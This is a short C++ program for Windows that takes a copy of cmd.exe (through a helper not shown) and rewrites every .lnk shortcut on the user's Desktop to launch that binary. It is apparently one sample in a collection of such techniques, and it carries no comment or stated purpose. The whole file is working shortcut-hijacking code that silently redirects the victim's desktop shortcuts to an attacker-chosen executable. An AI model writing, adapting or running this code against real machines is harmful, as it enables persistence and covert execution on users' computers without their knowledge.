#include <windows.h>
#include <string>
#include <list>

#include "..\..\utils.h"

using namespace std;

string ExeName = "Cmd.exe";
string ExePath = string(getenv("WINDIR")) + "\\System32\\" + ExeName;

string Folder = string(getenv("USERPROFILE")) + "\\Desktop\\";
string RegEx = "*.lnk";


int main(){

    string binaryPath = newBinary(ExePath);

    list<string> files = ls(Folder, RegEx);

    for(auto it=files.begin(); it!=files.end(); ++it) {

        modify_shortcut(*it, binaryPath);

    }

    return 0;
}